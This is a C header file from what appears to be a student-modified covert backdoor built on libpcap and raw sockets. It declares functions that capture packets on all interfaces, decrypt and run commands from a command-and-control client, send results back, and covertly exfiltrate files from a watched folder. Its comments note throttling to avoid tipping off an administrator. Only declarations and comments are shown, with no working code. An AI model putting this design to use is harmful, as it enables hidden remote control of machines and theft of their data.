#ifndef CAPTURE_H
#define CAPTURE_H

/*
SOURCE FILE: server.h

PROGRAM: Backdoor - A covert backdoor client/server using libpcap and raw sockets.

DATE: November 29, 2011

REVISIONS:
	1.0 - October 23
	1.1 - November 29, 2011

DESIGNERS:
	Martin Casado
	Modified by Aman Abdulla
	Modified by Santana Mach and Steve Stanisic

PROGRAMMERS:
  Modified by Santana Mach and Steve Stanisic

NOTES: This file contains functionality to start packet capture using
	libpcap. This has been modified to capture on all interfaces as
	we don't know which one our command and control client will be
	communicating with. We've also attempted to limit the rate at which
	libpcap busy loops so that we don't show up at the top of the
	process activity lists and tip off an admin.
*/

#include <pcap.h>
#include "defs.h"

/*
FUNCTION: pcap_init

PARAMS:
	uint32 ipaddr: The ip address we will use for exfiltrated data.
	const char* filter: The packet filter to apply.
	int chan: The covert channel to use.

RETURN: none.

NOTES: Call this function to start libpcap packet capture and exfiltration functions.
*/
void pcap_start(uint32 ipaddr, char *folder, int chan);
/*
FUNCTION: execute

PARAMS:
	char *command: The command to execute.
	u_int32_t ip: The client ip in network byte order.
	u_int16_t port: The destination port in network byte order.

RETURN: None.

NOTES: This method will execute the command and optionally send the
	encrypted results back to the client.
*/
void execute(char *command, u_int32_t ip, u_int16_t port);
/*
FUNCTION: pkt_handler

PARAMS:
	u_char *user: This will hold our duplex bool.
	const struct pcap_pkthdr *pkt_inf: Information about the captured packet.
	const u_char *packet: The captured packet data.

RETURN: none.

NOTES: This function will be called any time a matching packet is captured,
	it will check for the proper header key and then attempt to decrypt and
	execute the command contained within.
*/
void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet);

/*
FUNCTION: exfil_watch

PARAMS:
	void *arg: The exfil_pack struct with the ip address to send to and folder to watch.

RETURN: none.

NOTES: Call this function to start the covert file exfiltration functionality.
*/
void* exfil_watch(void *arg);

#endif
